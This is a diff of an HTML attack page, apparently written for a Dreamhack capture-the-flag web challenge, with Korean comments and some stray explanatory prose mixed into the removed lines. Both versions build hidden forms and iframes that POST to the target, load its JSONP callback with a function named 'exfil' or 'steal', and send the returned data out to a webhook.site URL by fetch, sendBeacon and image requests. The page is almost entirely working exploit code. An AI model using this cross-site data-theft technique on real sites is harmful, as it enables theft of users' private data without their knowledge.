@@ -1,142 +1,63 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="UTF-8">
+<title>Loading...</title>
+</head>
 <body>
-<h1>Loading...</h1>
-
-<!-- iframe으로 /post 로드 -->
-<iframe id="frame" src="http://host8.dreamhack.games:9182/post" style="display:none" name="target"></iframe>
-
-<!-- Form으로 POST 요청 (CORS 우회) -->
-<form id="myform" action="http://host8.dreamhack.games:9182/post" method="POST" target="target" style="display:none">
-  <input name="info_value" id="flag_input">
-</form>
-
+<h1>Processing...</h1>
 <script>
-const WEBHOOK = 'https://webhook.site/c9d4a3d0-88aa-45d5-8c8a-6c317e3f2bd1';
-
-let flagValue = '';
-
-// Step 1: iframe 로드 완료 대기
-document.getElementById('frame').onload = function() {
-  console.log('[1] /post 로드 완료');
+(function() {
+  var webhook = 'https://webhook.site/c9d4a3d0-88aa-45d5-8c8a-6c317e3f2bd1';
   
-  // iframe의 URL을 확인해서 POST 후 리다이렉트인지 체크
-  try {
-    const iframeUrl = this.contentWindow.location.href;
-    console.log('iframe URL:', iframeUrl);
-    
-    if (iframeUrl.includes('/info')) {
-      // POST 완료 후 /info로 리다이렉트됨
-      console.log('[3] POST 완료! callback 호출 중...');
-      callCallback();
-      return;
-    }
-  } catch(e) {
-    // Cross-origin이면 에러 (정상)
-    console.log('Cross-origin (expected)');
-  }
+  // Step 1: Form 생성 및 제출
+  var form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'http://host8.dreamhack.games:9182/post';
+  form.target = 'iframe1';
+  form.style.display = 'none';
   
-  // 첫 로드인 경우: form 제출 준비
-  setTimeout(submitForm, 1000);
-};
-
-function submitForm() {
-  console.log('[2] Form 제출 중...');
+  var input = document.createElement('input');
+  input.name = 'info_value';
+  input.value = 'TEST_VALUE';
+  form.appendChild(input);
   
-  // 임의의 값으로 시도 (FLAG를 모르므로)
-  // 하지만 여러 값을 시도할 수 있습니다
-  document.getElementById('flag_input').value = 'DH{test_flag}';
-  document.getElementById('myform').submit();
+  var iframe = document.createElement('iframe');
+  iframe.name = 'iframe1';
+  iframe.style.display = 'none';
   
-  // 제출 후 대기 (onload가 다시 트리거됨)
-}
-
-function callCallback() {
-  window.exfil = function(data) {
-    console.log('[4] 데이터 수신:', data);
-    
-    const flag = data.info || 'EMPTY';
-    
-    // 여러 방법으로 전송
-    fetch(WEBHOOK + '?flag=' + encodeURIComponent(flag)).catch(e => {});
-    
-    if (navigator.sendBeacon) {
-      navigator.sendBeacon(WEBHOOK + '?beacon=' + encodeURIComponent(flag));
-    }
-    
-    new Image().src = WEBHOOK + '?img=' + encodeURIComponent(flag);
-  };
+  document.body.appendChild(iframe);
+  document.body.appendChild(form);
   
-  const script = document.createElement('script');
-  script.src = 'http://host8.dreamhack.games:9182/callback?callback=window.exfil';
-  document.body.appendChild(script);
-}
-
-// 에러 핸들링
-window.onerror = function(msg) {
-  new Image().src = WEBHOOK + '?error=' + encodeURIComponent(msg);
-};
-</script>
-</body>
-</html>
-하지만 이것도 문제가 있습니다 - FLAG를 모르므로 임의 값만 POST됩니다.
-🔥 진짜 해결책: 2-Step Attack
-더 나은 방법은 봇이 host8.dreamhack.games 내부 페이지를 방문하게 하는 것입니다! 새로운 아이디어: /callback 페이지를 악용!
-<!DOCTYPE html>
-<html>
-<body>
-<script>
-const WEBHOOK = 'https://webhook.site/c9d4a3d0-88aa-45d5-8c8a-6c317e3f2bd1';
-
-// Step 1: Form으로 더미 데이터 POST
-const form = document.createElement('form');
-form.method = 'POST';
-form.action = 'http://host8.dreamhack.games:9182/post';
-form.target = 'hiddenFrame';
-
-const input = document.createElement('input');
-input.name = 'info_value';
-input.value = 'LEAK_TEST';
-form.appendChild(input);
-
-const iframe = document.createElement('iframe');
-iframe.name = 'hiddenFrame';
-iframe.style.display = 'none';
-document.body.appendChild(iframe);
-document.body.appendChild(form);
-
-console.log('[1] Submitting form...');
-form.submit();
-
-// Step 2: Form 제출 후 callback 호출
-setTimeout(() => {
-  console.log('[2] Calling callback...');
+  console.log('[1] Submitting form');
+  form.submit();
   
-  window.exfil = function(data) {
-    console.log('[3] Data received:', data);
-    const info = JSON.stringify(data);
+  // Step 2: Callback 호출
+  setTimeout(function() {
+    console.log('[2] Loading callback');
     
-    // 전송
-    if (navigator.sendBeacon) {
-      navigator.sendBeacon(WEBHOOK + '?data=' + encodeURIComponent(info));
-    }
-    new Image().src = WEBHOOK + '?img=' + encodeURIComponent(info);
+    window.steal = function(data) {
+      console.log('[3] Got data:', data);
+      var info = JSON.stringify(data);
+      
+      // 전송
+      new Image().src = webhook + '?data=' + encodeURIComponent(info);
+      
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(webhook + '?beacon=' + encodeURIComponent(info));
+      }
+    };
     
-    try {
-      fetch(WEBHOOK, {
-        method: 'POST',
-        body: 'data=' + encodeURIComponent(info)
-      });
-    } catch(e) {}
-  };
+    var s = document.createElement('script');
+    s.src = 'http://host8.dreamhack.games:9182/callback?callback=window.steal';
+    s.onerror = function() {
+      new Image().src = webhook + '?error=callback_failed';
+    };
+    document.body.appendChild(s);
+    
+  }, 2000);
   
-  const script = document.createElement('script');
-  script.src = 'http://host8.dreamhack.games:9182/callback?callback=window.exfil';
-  script.onerror = () => {
-    new Image().src = WEBHOOK + '?error=script_load_failed';
-  };
-  document.body.appendChild(script);
-}, 2000);
+})();
 </script>
 </body>
 </html>
